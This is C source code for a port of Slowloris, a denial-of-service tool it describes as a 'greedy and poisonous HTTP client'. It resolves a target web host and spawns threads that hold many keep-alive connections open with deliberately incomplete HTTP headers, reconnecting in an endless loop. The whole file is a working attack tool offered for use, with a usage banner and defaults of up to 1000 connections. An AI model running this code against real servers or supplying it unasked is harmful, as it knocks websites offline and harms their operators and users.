
#ifndef  WIN32
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>
#include <netdb.h>
#else
#include <windows.h>
#endif
#include <stdlib.h>
#include "slowloris.h"
#include <stdio.h>
#include <string.h>
#include <math.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>

char sendhost[1024];
char method[5];
long packetcount = 0;
#ifdef WIN32
int connectionsperthread = 10;
#else
int connectionsperthread = 50;
#endif
struct sockaddr_in connect_data;
long long wait_time;

int main( int argc, const char **argv )
{
    struct hostent *hp;
#ifndef WIN32
    signal( SIGPIPE, SIG_IGN );
#else
    int version_req;
    WSADATA wsadata;
    version_req = 2;
    WSAStartup( version_req, &wsadata );
#endif
    printf(
		"CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@@@8@8@@@@888OOCooocccc::::\n"
		"CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::\n"
		"CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@88@@8OOCOOOCoc::\n"
		"CCCCooooooCCCO88@@8@88@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888@8888OOOCc::::\n"
		"CooCoCoooCCCO8@88@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:\n"
		"ooooooCoCCC88@88888@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88@888OCoccc\n"
		"ooooCCOO8O888888888@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo\n"
		"oCCCCCCO8OOOCCCOO88@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC\n"
		"oCCCCCOOO88OCooCO88@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC\n"
		"oCCCCOO88OOCCCCOO8@@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO\n"
		"CCCOOOO88OOCCOOO8@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O\n"
		"CCCOO88888OOCOO8@@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO\n"
		"OOOOOO88888OOOO8@8@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO\n"
		"OOOOO888@8@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO\n"
		"COOO888@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO\n"
		"CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC\n"
		"coooCCO8@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC\n"
		":ccooooCO888OOOO8OOc..:...::. .co8@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC\n"
		".:::coocccoO8OOOOOOC:..::....coCO8@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC\n"
		"....::::ccccoCCOOOOOCc......:oCO8@8@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo\n"
		".......::::::::cCCCCCCoocc:cO888@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc\n"
		"...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co\n"
		".............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo\n"
		" ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC\n"
		"   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco\n"
		"  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc\n"
		"       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco\n"
		" Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client\n");

    if( !parse_args( argc, argv, global_arg_list, 1 ))
    {
        return 0;
    }

    if( help )
    {
        print_args();
        return 0;
    }

    if( version )
    {
        printf("slowloris version 0.1\n");
        return 0;
    }

    if(filename[0] != '\0')
    {
        parse_file( filename );
    }

    if( dns[0] == '\0')
    {
        printf("Usage:\n\n\t %s -dns [www.example.com] -options\n", argv[0]);
        return 0;
    }

    if( httpready )
    {
        strcpy( method, "POST" );
    }
    else
    {
        strcpy( method, "GET" );
    }

    if( timeout <= 0 )
    {
        timeout = 100;
        printf("defaulting to 100 second re-try timeout.\n");
    }

    if( num <= 0)
    {
#ifdef WIN32
        num = 100;
        printf("Defaulting to 100 connections.\n");
#else
        num = 1000;
        printf("Defaulting to 1000 connections.\n");
#endif
    }

    wait_time = (long long) timeout * 1000000/num;  //wait time in MicroSeconds

    strcpy( sendhost, dns );

    if((hp = (struct hostent *) gethostbyname(dns)) == NULL)
    {
        printf("Failed to resolve the host name %s\n", dns);
	    getchar();
        return -1;
    }
    if(port <= 0)
    {
        port = 80;
        printf("Defaulting to port 80.\n");
    }
    printf( "Host name %s Resolved to %d.%d.%d.%d, length %d\n", dns,
            (unsigned char) hp->h_addr[0], (unsigned char) hp->h_addr[1], (unsigned char) hp->h_addr[2], (unsigned char) hp->h_addr[3], hp->h_length);
    memset( &connect_data, 0, sizeof(connect_data));
    memcpy( &(connect_data.sin_addr.s_addr),  &(hp->h_addr_list[0][0]), 4);
    connect_data.sin_family = hp->h_addrtype;
    connect_data.sin_port = htons( port );

    printf( "Connecting to %s:%d every %d seconds with %d sockets:\n", dns, port, timeout, num);

    domultithreading( num );

    return 0;
}

void doconnections( int num)
{
    int *socks = NULL;
    int i;
    char sendbuf[1024];
    char buf[1024];
    int written;
    socks = malloc( sizeof(*socks) * num );
    int random;
    //int len;
    const int flag = 1; //True for SO_KEEPALIVE

    while( 1 )
    {
        for( i = 0; i < num; i++)
        {
            // Get a free socket
            close( socks[i] );
            if( (socks[i] = socket( AF_INET, SOCK_STREAM, 0 )) == -1 )
            {
                printf( "socket call failed %d", i);
            }
            else
            {
            #ifdef WIN32
                setsockopt(socks[i], SOL_SOCKET, SO_KEEPALIVE,(const char *) &flag, sizeof( flag ));
            #else
                setsockopt(socks[i], SOL_SOCKET, SO_KEEPALIVE, &flag, sizeof( flag ));
            #endif
                if( connect( socks[i], (struct sockaddr *) &connect_data, sizeof(struct sockaddr)) == -1)
                {
                    printf("Connect failed: %d, %s\n",  errno, strerror( errno ) );
                }
                else 
                {
                    packetcount += 3; //SYN, SYN+ACK, ACK
                    if( !nopayload )
                    {
                        if( !httpready )
                        {
                            //Randomly mix between head and get requests.
                            if( (rand()%2) == 0 )
                            {
                                strcpy( method, "HEAD" );
                            }
                            else
                            {
                                strcpy( method, "GET" );
                            }
                        }
                        if( cache )
                        {
                            random = rand();
                            snprintf(  buf, 1024,"%s /%d HTTP/1.1\r\n"
                                                     "Host: %s\r\n"
                                                     "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                                                     "Connection: Keep-Alive\r\n"
                                                    // "Content-Length: "
                                                     , method, random, sendhost);
                            //len = strlen( buf ) + 3;
                            //snprintf( sendbuf, 1024, "%s%d\r\n", buf, len );
                            strcpy(sendbuf, buf);

                        }
                        else
                        {
                            snprintf(  buf, 1024,"%s / HTTP/1.1\r\n"
                                                     "Host: %s\r\n"
                                                     "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                                                     "Connection: Keep-Alive\r\n"
                                                     , method, sendhost);
                            //len = strlen( buf )+3;
                            //snprintf( sendbuf, 1024, "%s%d\r\n", buf, len );
                            strcpy(sendbuf, buf);
                        }
                        written = strlen(sendbuf);
#ifndef WIN32
                        send( socks[i], sendbuf, written, MSG_NOSIGNAL);
#else
                        send( socks[i], sendbuf, written, 0);
#endif
                    }
                    #ifdef WIN32
                    Sleep( wait_time/1000 );
                    #else
                    usleep( wait_time );
                    #endif
                }
            }
        }
    }
}


void domultithreading( int num )
{
#ifndef WIN32
    pthread_t *threads;
    pthread_attr_t attr;
#else
    HANDLE *threads;
#endif
    int pthread_cnt;
    int i = 0, j = 0;

    pthread_cnt = (num/connectionsperthread) + 1;

    threads = malloc( sizeof(*threads) * pthread_cnt);

#ifndef WIN32
    pthread_attr_init( &attr );
#endif

    while( i < num )
    {
        printf("Creating thread %d of %d\n", j+1, pthread_cnt-1);
#ifndef WIN32
        pthread_create( (threads + j), &attr, dothread , NULL );
#else
        threads[j] = CreateThread( NULL, 0, dothread, NULL, 0, NULL );
#endif
        j++;
        i += connectionsperthread;
    }

    while( 1 )
    {
#ifdef WIN32
        Sleep( 60000 );
#else
        sleep(60);
#endif
        printf( "Slowloris has now sent %ld packets successfully.\n", packetcount);
    }
    return;
}

#ifndef WIN32
void *dothread( void *args )
#else
DWORD WINAPI dothread( void *args )
#endif
{
    doconnections( connectionsperthread );
#ifdef WIN32
    return 0;
#else
    return NULL;
#endif
}
